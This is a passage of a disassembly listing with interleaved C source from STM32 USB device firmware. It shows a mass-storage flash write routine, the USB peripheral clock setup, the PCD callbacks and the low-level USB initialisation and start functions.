 800c9d2:	f7f4 febb 	bl	800174c <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c9d6:	2300      	movs	r3, #0
 800c9d8:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c9da:	2301      	movs	r3, #1
 800c9dc:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c9de:	687b      	ldr	r3, [r7, #4]
 800c9e0:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c9e4:	3340      	adds	r3, #64	; 0x40
 800c9e6:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c9ea:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c9ec:	89bb      	ldrh	r3, [r7, #12]
 800c9ee:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c9f0:	2300      	movs	r3, #0
 800c9f2:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c9f4:	f107 0210 	add.w	r2, r7, #16
 800c9f8:	f107 0314 	add.w	r3, r7, #20
 800c9fc:	4611      	mov	r1, r2
 800c9fe:	4618      	mov	r0, r3
 800ca00:	f7f4 ff8a 	bl	8001918 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800ca04:	2300      	movs	r3, #0
 800ca06:	84fb      	strh	r3, [r7, #38]	; 0x26
 800ca08:	e011      	b.n	800ca2e <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800ca0a:	687b      	ldr	r3, [r7, #4]
 800ca0c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800ca10:	3340      	adds	r3, #64	; 0x40
 800ca12:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800ca14:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800ca16:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800ca18:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800ca1a:	68ba      	ldr	r2, [r7, #8]
 800ca1c:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800ca1e:	e9d3 2300 	ldrd	r2, r3, [r3]
 800ca22:	2000      	movs	r0, #0
 800ca24:	f7f4 fe26 	bl	8001674 <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800ca28:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800ca2a:	3308      	adds	r3, #8
 800ca2c:	84fb      	strh	r3, [r7, #38]	; 0x26
 800ca2e:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800ca30:	89bb      	ldrh	r3, [r7, #12]
 800ca32:	02db      	lsls	r3, r3, #11
 800ca34:	429a      	cmp	r2, r3
 800ca36:	d3e8      	bcc.n	800ca0a <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800ca38:	f7f4 feaa 	bl	8001790 <HAL_FLASH_Lock>
		return USBD_OK;
 800ca3c:	2300      	movs	r3, #0
 800ca3e:	e000      	b.n	800ca42 <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800ca40:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800ca42:	4618      	mov	r0, r3
 800ca44:	3728      	adds	r7, #40	; 0x28
 800ca46:	46bd      	mov	sp, r7
 800ca48:	bd80      	pop	{r7, pc}

0800ca4a <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800ca4a:	b480      	push	{r7}
 800ca4c:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800ca4e:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800ca50:	4618      	mov	r0, r3
 800ca52:	46bd      	mov	sp, r7
 800ca54:	f85d 7b04 	ldr.w	r7, [sp], #4
 800ca58:	4770      	bx	lr
	...

0800ca5c <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800ca5c:	b580      	push	{r7, lr}
 800ca5e:	b098      	sub	sp, #96	; 0x60
 800ca60:	af00      	add	r7, sp, #0
 800ca62:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800ca64:	f107 030c 	add.w	r3, r7, #12
 800ca68:	2254      	movs	r2, #84	; 0x54
 800ca6a:	2100      	movs	r1, #0
 800ca6c:	4618      	mov	r0, r3
 800ca6e:	f000 fbd5 	bl	800d21c <memset>
  if(pcdHandle->Instance==USB)
 800ca72:	687b      	ldr	r3, [r7, #4]
 800ca74:	681b      	ldr	r3, [r3, #0]
 800ca76:	4a1d      	ldr	r2, [pc, #116]	; (800caec <HAL_PCD_MspInit+0x90>)
 800ca78:	4293      	cmp	r3, r2
 800ca7a:	d132      	bne.n	800cae2 <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800ca7c:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800ca80:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800ca82:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800ca86:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800ca88:	2301      	movs	r3, #1
 800ca8a:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800ca8c:	2301      	movs	r3, #1
 800ca8e:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800ca90:	2318      	movs	r3, #24
 800ca92:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800ca94:	2307      	movs	r3, #7
 800ca96:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800ca98:	2302      	movs	r3, #2
 800ca9a:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800ca9c:	2302      	movs	r3, #2
 800ca9e:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800caa0:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800caa4:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800caa6:	f107 030c 	add.w	r3, r7, #12
 800caaa:	4618      	mov	r0, r3
 800caac:	f7f7 fe5c 	bl	8004768 <HAL_RCCEx_PeriphCLKConfig>
 800cab0:	4603      	mov	r3, r0
 800cab2:	2b00      	cmp	r3, #0
 800cab4:	d001      	beq.n	800caba <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800cab6:	f7f4 fa03 	bl	8000ec0 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800caba:	4b0d      	ldr	r3, [pc, #52]	; (800caf0 <HAL_PCD_MspInit+0x94>)
 800cabc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800cabe:	4a0c      	ldr	r2, [pc, #48]	; (800caf0 <HAL_PCD_MspInit+0x94>)
 800cac0:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800cac4:	6593      	str	r3, [r2, #88]	; 0x58
 800cac6:	4b0a      	ldr	r3, [pc, #40]	; (800caf0 <HAL_PCD_MspInit+0x94>)
 800cac8:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800caca:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800cace:	60bb      	str	r3, [r7, #8]
 800cad0:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800cad2:	2200      	movs	r2, #0
 800cad4:	2100      	movs	r1, #0
 800cad6:	2043      	movs	r0, #67	; 0x43
 800cad8:	f7f4 fd95 	bl	8001606 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800cadc:	2043      	movs	r0, #67	; 0x43
 800cade:	f7f4 fdae 	bl	800163e <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800cae2:	bf00      	nop
 800cae4:	3760      	adds	r7, #96	; 0x60
 800cae6:	46bd      	mov	sp, r7
 800cae8:	bd80      	pop	{r7, pc}
 800caea:	bf00      	nop
 800caec:	40006800 	.word	0x40006800
 800caf0:	40021000 	.word	0x40021000

0800caf4 <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800caf4:	b580      	push	{r7, lr}
 800caf6:	b082      	sub	sp, #8
 800caf8:	af00      	add	r7, sp, #0
 800cafa:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800cafc:	687b      	ldr	r3, [r7, #4]
 800cafe:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800cb02:	687b      	ldr	r3, [r7, #4]
 800cb04:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800cb08:	4619      	mov	r1, r3
 800cb0a:	4610      	mov	r0, r2
 800cb0c:	f7fe fb70 	bl	800b1f0 <USBD_LL_SetupStage>
}
 800cb10:	bf00      	nop
 800cb12:	3708      	adds	r7, #8
 800cb14:	46bd      	mov	sp, r7
 800cb16:	bd80      	pop	{r7, pc}

0800cb18 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb18:	b580      	push	{r7, lr}
 800cb1a:	b082      	sub	sp, #8
 800cb1c:	af00      	add	r7, sp, #0
 800cb1e:	6078      	str	r0, [r7, #4]
 800cb20:	460b      	mov	r3, r1
 800cb22:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800cb24:	687b      	ldr	r3, [r7, #4]
 800cb26:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800cb2a:	78fa      	ldrb	r2, [r7, #3]
 800cb2c:	6879      	ldr	r1, [r7, #4]
 800cb2e:	4613      	mov	r3, r2
 800cb30:	009b      	lsls	r3, r3, #2
 800cb32:	4413      	add	r3, r2
 800cb34:	00db      	lsls	r3, r3, #3
 800cb36:	440b      	add	r3, r1
 800cb38:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800cb3c:	681a      	ldr	r2, [r3, #0]
 800cb3e:	78fb      	ldrb	r3, [r7, #3]
 800cb40:	4619      	mov	r1, r3
 800cb42:	f7fe fbaa 	bl	800b29a <USBD_LL_DataOutStage>
}
 800cb46:	bf00      	nop
 800cb48:	3708      	adds	r7, #8
 800cb4a:	46bd      	mov	sp, r7
 800cb4c:	bd80      	pop	{r7, pc}

0800cb4e <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb4e:	b580      	push	{r7, lr}
 800cb50:	b082      	sub	sp, #8
 800cb52:	af00      	add	r7, sp, #0
 800cb54:	6078      	str	r0, [r7, #4]
 800cb56:	460b      	mov	r3, r1
 800cb58:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800cb5a:	687b      	ldr	r3, [r7, #4]
 800cb5c:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800cb60:	78fa      	ldrb	r2, [r7, #3]
 800cb62:	6879      	ldr	r1, [r7, #4]
 800cb64:	4613      	mov	r3, r2
 800cb66:	009b      	lsls	r3, r3, #2
 800cb68:	4413      	add	r3, r2
 800cb6a:	00db      	lsls	r3, r3, #3
 800cb6c:	440b      	add	r3, r1
 800cb6e:	333c      	adds	r3, #60	; 0x3c
 800cb70:	681a      	ldr	r2, [r3, #0]
 800cb72:	78fb      	ldrb	r3, [r7, #3]
 800cb74:	4619      	mov	r1, r3
 800cb76:	f7fe fc43 	bl	800b400 <USBD_LL_DataInStage>
}
 800cb7a:	bf00      	nop
 800cb7c:	3708      	adds	r7, #8
 800cb7e:	46bd      	mov	sp, r7
 800cb80:	bd80      	pop	{r7, pc}

0800cb82 <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb82:	b580      	push	{r7, lr}
 800cb84:	b082      	sub	sp, #8
 800cb86:	af00      	add	r7, sp, #0
 800cb88:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800cb8a:	687b      	ldr	r3, [r7, #4]
 800cb8c:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb90:	4618      	mov	r0, r3
 800cb92:	f7fe fd7d 	bl	800b690 <USBD_LL_SOF>
}
 800cb96:	bf00      	nop
 800cb98:	3708      	adds	r7, #8
 800cb9a:	46bd      	mov	sp, r7
 800cb9c:	bd80      	pop	{r7, pc}

0800cb9e <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb9e:	b580      	push	{r7, lr}
 800cba0:	b084      	sub	sp, #16
 800cba2:	af00      	add	r7, sp, #0
 800cba4:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800cba6:	2301      	movs	r3, #1
 800cba8:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800cbaa:	687b      	ldr	r3, [r7, #4]
 800cbac:	689b      	ldr	r3, [r3, #8]
 800cbae:	2b02      	cmp	r3, #2
 800cbb0:	d001      	beq.n	800cbb6 <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800cbb2:	f7f4 f985 	bl	8000ec0 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800cbb6:	687b      	ldr	r3, [r7, #4]
 800cbb8:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cbbc:	7bfa      	ldrb	r2, [r7, #15]
 800cbbe:	4611      	mov	r1, r2
 800cbc0:	4618      	mov	r0, r3
 800cbc2:	f7fe fd21 	bl	800b608 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800cbc6:	687b      	ldr	r3, [r7, #4]
 800cbc8:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cbcc:	4618      	mov	r0, r3
 800cbce:	f7fe fcc9 	bl	800b564 <USBD_LL_Reset>
}
 800cbd2:	bf00      	nop
 800cbd4:	3710      	adds	r7, #16
 800cbd6:	46bd      	mov	sp, r7
 800cbd8:	bd80      	pop	{r7, pc}
	...

0800cbdc <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cbdc:	b580      	push	{r7, lr}
 800cbde:	b082      	sub	sp, #8
 800cbe0:	af00      	add	r7, sp, #0
 800cbe2:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800cbe4:	687b      	ldr	r3, [r7, #4]
 800cbe6:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cbea:	4618      	mov	r0, r3
 800cbec:	f7fe fd1c 	bl	800b628 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800cbf0:	687b      	ldr	r3, [r7, #4]
 800cbf2:	699b      	ldr	r3, [r3, #24]
 800cbf4:	2b00      	cmp	r3, #0
 800cbf6:	d005      	beq.n	800cc04 <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cbf8:	4b04      	ldr	r3, [pc, #16]	; (800cc0c <HAL_PCD_SuspendCallback+0x30>)
 800cbfa:	691b      	ldr	r3, [r3, #16]
 800cbfc:	4a03      	ldr	r2, [pc, #12]	; (800cc0c <HAL_PCD_SuspendCallback+0x30>)
 800cbfe:	f043 0306 	orr.w	r3, r3, #6
 800cc02:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800cc04:	bf00      	nop
 800cc06:	3708      	adds	r7, #8
 800cc08:	46bd      	mov	sp, r7
 800cc0a:	bd80      	pop	{r7, pc}
 800cc0c:	e000ed00 	.word	0xe000ed00

0800cc10 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cc10:	b580      	push	{r7, lr}
 800cc12:	b082      	sub	sp, #8
 800cc14:	af00      	add	r7, sp, #0
 800cc16:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800cc18:	687b      	ldr	r3, [r7, #4]
 800cc1a:	699b      	ldr	r3, [r3, #24]
 800cc1c:	2b00      	cmp	r3, #0
 800cc1e:	d007      	beq.n	800cc30 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cc20:	4b08      	ldr	r3, [pc, #32]	; (800cc44 <HAL_PCD_ResumeCallback+0x34>)
 800cc22:	691b      	ldr	r3, [r3, #16]
 800cc24:	4a07      	ldr	r2, [pc, #28]	; (800cc44 <HAL_PCD_ResumeCallback+0x34>)
 800cc26:	f023 0306 	bic.w	r3, r3, #6
 800cc2a:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800cc2c:	f000 faf0 	bl	800d210 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800cc30:	687b      	ldr	r3, [r7, #4]
 800cc32:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cc36:	4618      	mov	r0, r3
 800cc38:	f7fe fd12 	bl	800b660 <USBD_LL_Resume>
}
 800cc3c:	bf00      	nop
 800cc3e:	3708      	adds	r7, #8
 800cc40:	46bd      	mov	sp, r7
 800cc42:	bd80      	pop	{r7, pc}
 800cc44:	e000ed00 	.word	0xe000ed00

0800cc48 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800cc48:	b580      	push	{r7, lr}
 800cc4a:	b082      	sub	sp, #8
 800cc4c:	af00      	add	r7, sp, #0
 800cc4e:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800cc50:	f7f6 ff42 	bl	8003ad8 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800cc54:	4a26      	ldr	r2, [pc, #152]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc56:	687b      	ldr	r3, [r7, #4]
 800cc58:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800cc5c:	687b      	ldr	r3, [r7, #4]
 800cc5e:	4a24      	ldr	r2, [pc, #144]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc60:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800cc64:	4b22      	ldr	r3, [pc, #136]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc66:	4a23      	ldr	r2, [pc, #140]	; (800ccf4 <USBD_LL_Init+0xac>)
 800cc68:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800cc6a:	4b21      	ldr	r3, [pc, #132]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc6c:	2208      	movs	r2, #8
 800cc6e:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800cc70:	4b1f      	ldr	r3, [pc, #124]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc72:	2202      	movs	r2, #2
 800cc74:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800cc76:	4b1e      	ldr	r3, [pc, #120]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc78:	2202      	movs	r2, #2
 800cc7a:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800cc7c:	4b1c      	ldr	r3, [pc, #112]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc7e:	2200      	movs	r2, #0
 800cc80:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800cc82:	4b1b      	ldr	r3, [pc, #108]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc84:	2200      	movs	r2, #0
 800cc86:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800cc88:	4b19      	ldr	r3, [pc, #100]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc8a:	2200      	movs	r2, #0
 800cc8c:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800cc8e:	4b18      	ldr	r3, [pc, #96]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc90:	2200      	movs	r2, #0
 800cc92:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800cc94:	4816      	ldr	r0, [pc, #88]	; (800ccf0 <USBD_LL_Init+0xa8>)
 800cc96:	f7f5 f8e7 	bl	8001e68 <HAL_PCD_Init>
 800cc9a:	4603      	mov	r3, r0
 800cc9c:	2b00      	cmp	r3, #0
 800cc9e:	d001      	beq.n	800cca4 <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800cca0:	f7f4 f90e 	bl	8000ec0 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800cca4:	687b      	ldr	r3, [r7, #4]
 800cca6:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ccaa:	2318      	movs	r3, #24
 800ccac:	2200      	movs	r2, #0
 800ccae:	2100      	movs	r1, #0
 800ccb0:	f7f6 fe31 	bl	8003916 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800ccb4:	687b      	ldr	r3, [r7, #4]
 800ccb6:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ccba:	2358      	movs	r3, #88	; 0x58
 800ccbc:	2200      	movs	r2, #0
 800ccbe:	2180      	movs	r1, #128	; 0x80
 800ccc0:	f7f6 fe29 	bl	8003916 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800ccc4:	687b      	ldr	r3, [r7, #4]
 800ccc6:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ccca:	2398      	movs	r3, #152	; 0x98
 800cccc:	2200      	movs	r2, #0
 800ccce:	2181      	movs	r1, #129	; 0x81
 800ccd0:	f7f6 fe21 	bl	8003916 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800ccd4:	687b      	ldr	r3, [r7, #4]
 800ccd6:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ccda:	23d8      	movs	r3, #216	; 0xd8
 800ccdc:	2200      	movs	r2, #0
 800ccde:	2101      	movs	r1, #1
 800cce0:	f7f6 fe19 	bl	8003916 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800cce4:	2300      	movs	r3, #0
}
 800cce6:	4618      	mov	r0, r3
 800cce8:	3708      	adds	r7, #8
 800ccea:	46bd      	mov	sp, r7
 800ccec:	bd80      	pop	{r7, pc}
 800ccee:	bf00      	nop
 800ccf0:	20000b7c 	.word	0x20000b7c
 800ccf4:	40006800 	.word	0x40006800

0800ccf8 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800ccf8:	b580      	push	{r7, lr}
 800ccfa:	b084      	sub	sp, #16
 800ccfc:	af00      	add	r7, sp, #0
 800ccfe:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd00:	2300      	movs	r3, #0
 800cd02:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd04:	2300      	movs	r3, #0
 800cd06:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cd08:	687b      	ldr	r3, [r7, #4]
 800cd0a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd0e:	4618      	mov	r0, r3
 800cd10:	f7f5 f9b0 	bl	8002074 <HAL_PCD_Start>
 800cd14:	4603      	mov	r3, r0
 800cd16:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd18:	7bbb      	ldrb	r3, [r7, #14]
 800cd1a:	2b03      	cmp	r3, #3
 800cd1c:	d816      	bhi.n	800cd4c <USBD_LL_Start+0x54>
 800cd1e:	a201      	add	r2, pc, #4	; (adr r2, 800cd24 <USBD_LL_Start+0x2c>)
 800cd20:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd24:	0800cd35 	.word	0x0800cd35
 800cd28:	0800cd3b 	.word	0x0800cd3b
 800cd2c:	0800cd41 	.word	0x0800cd41
 800cd30:	0800cd47 	.word	0x0800cd47
    case HAL_OK :
      usb_status = USBD_OK;
 800cd34:	2300      	movs	r3, #0
 800cd36:	73fb      	strb	r3, [r7, #15]
    break;
 800cd38:	e00b      	b.n	800cd52 <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
